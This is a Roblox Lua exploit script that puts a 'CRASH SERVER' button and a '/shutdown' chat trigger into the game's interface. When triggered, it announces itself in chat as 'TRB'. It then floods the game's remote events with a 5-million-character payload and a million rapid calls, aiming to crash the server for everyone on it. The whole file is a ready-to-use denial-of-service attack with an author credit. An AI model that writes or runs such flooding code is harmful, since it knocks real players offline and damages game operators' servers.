local art = [[████████╗██████╗ ██████╗ 
╚══██╔══╝██╔══██╗██╔══██╗
   ██║   ██████╔╝██████╔╝
   ██║   ██╔══██╗██╔══██╗
   ██║   ██║  ██║██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚═════╝]]

print("|" .. (art:gsub("\n", "\n|")))
local RS          = game:GetService("ReplicatedStorage")
local Players     = game:GetService("Players")
local TextChatSvc = game:GetService("TextChatService")

local lp          = Players.LocalPlayer
local lpGui       = lp:WaitForChild("PlayerGui")

local UpdTextures = RS.DataEvents.UpdateTexturesChoice
local DataRemote  = RS.DataEvents.DataRemoteEvent

local PAYLOAD     = string.rep("A", 5e6)

local function sendChatMsg()
    local ok = pcall(function()
        local channel = TextChatSvc:FindFirstChild("TextChannels")
            and TextChatSvc.TextChannels:FindFirstChild("RBXGeneral")
        if channel then
            channel:SendAsync("Shuting down server creds to TRB")
        end
    end)

    if not ok then
        local sayRemote = RS:FindFirstChild("DefaultChatSystemChatEvents")
            and RS.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
        if sayRemote then
            sayRemote:FireServer("Shuting down server creds to TRB", "All")
        end
    end
end

local function flood()
    sendChatMsg()

    for _ = 1, 3 do
        UpdTextures:FireServer(PAYLOAD)
    end

    for _ = 1, 1e6 do
        DataRemote:FireServer()
    end
end

local sg = Instance.new("ScreenGui")
sg.Name             = "CrashGui"
sg.ResetOnSpawn     = false
sg.ZIndexBehavior   = Enum.ZIndexBehavior.Sibling
sg.Parent           = lpGui

local frame = Instance.new("Frame")
frame.Name              = "Panel"
frame.Size              = UDim2.new(0, 160, 0, 60)
frame.Position          = UDim2.new(0, 20, 0.5, -30)
frame.BackgroundColor3  = Color3.fromRGB(18, 18, 18)
frame.BorderSizePixel   = 0
frame.Active            = true
frame.Draggable         = true
frame.Parent            = sg

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent       = frame

local stroke = Instance.new("UIStroke")
stroke.Color        = Color3.fromRGB(200, 40, 40)
stroke.Thickness    = 1.5
stroke.Parent       = frame

local title = Instance.new("TextLabel")
title.Size              = UDim2.new(1, 0, 0, 20)
title.Position          = UDim2.new(0, 0, 0, 4)
title.BackgroundTransparency = 1
title.Text              = "TRB"
title.TextColor3        = Color3.fromRGB(200, 40, 40)
title.Font              = Enum.Font.GothamBold
title.TextSize          = 12
title.Parent            = frame

local btn = Instance.new("TextButton")
btn.Name                = "CrashBtn"
btn.Size                = UDim2.new(1, -20, 0, 28)
btn.Position            = UDim2.new(0, 10, 0, 26)
btn.BackgroundColor3    = Color3.fromRGB(200, 40, 40)
btn.BorderSizePixel     = 0
btn.Text                = "CRASH SERVER"
btn.TextColor3          = Color3.fromRGB(255, 255, 255)
btn.Font                = Enum.Font.GothamBold
btn.TextSize            = 13
btn.AutoButtonColor     = true
btn.Parent              = frame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 6)
btnCorner.Parent       = btn

btn.MouseButton1Click:Connect(flood)

lp.Chatted:Connect(function(msg)
    if msg:lower() == "/shutdown" then
        flood()
    end
end)
--credits to BLOX_FRUIT01110(TheRealBlox)
